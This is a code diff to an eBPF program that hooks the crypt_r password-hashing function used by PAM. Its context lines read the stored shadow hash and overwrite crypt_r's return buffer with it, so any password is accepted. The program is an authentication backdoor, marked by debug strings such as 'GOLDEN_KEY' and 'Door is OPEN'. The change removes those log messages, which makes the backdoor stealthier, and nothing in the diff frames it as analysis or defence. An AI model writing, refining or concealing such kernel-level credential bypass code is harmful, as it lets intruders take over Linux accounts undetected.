@@ -72,7 +72,6 @@ int BPF_KPROBE(crypt_r_enter, const char *phrase, const char *setting, void *dat
         // The 'setting' in PAM is usually the full shadow hash string
         bpf_probe_read_user_str(hd.hash_str, sizeof(hd.hash_str), setting);
         bpf_map_update_elem(&targeted_pids, &pid, &hd, BPF_ANY);
-        bpf_printk("GOLDEN_KEY: MATCH! PID %d, Stolen shadow hash: %s\n", pid, hd.hash_str);
     }
     return 0;
 }
@@ -100,11 +99,6 @@ int BPF_KRETPROBE(crypt_r_exit, char *ret) {
         if (len > 0) {
             // Directly write to the crypt_r output buffer, avoiding read-only memory (-EFAULT) issues
             long we = bpf_probe_write_user(ret, hd->hash_str, len);
-            if (we == 0) {
-                bpf_printk("GOLDEN_KEY: crypt_r output overwritten successfully. Door is OPEN.\n");
-            } else {
-                bpf_printk("GOLDEN_KEY: write failed: %d\n", we);
-            }
         }
     }
 
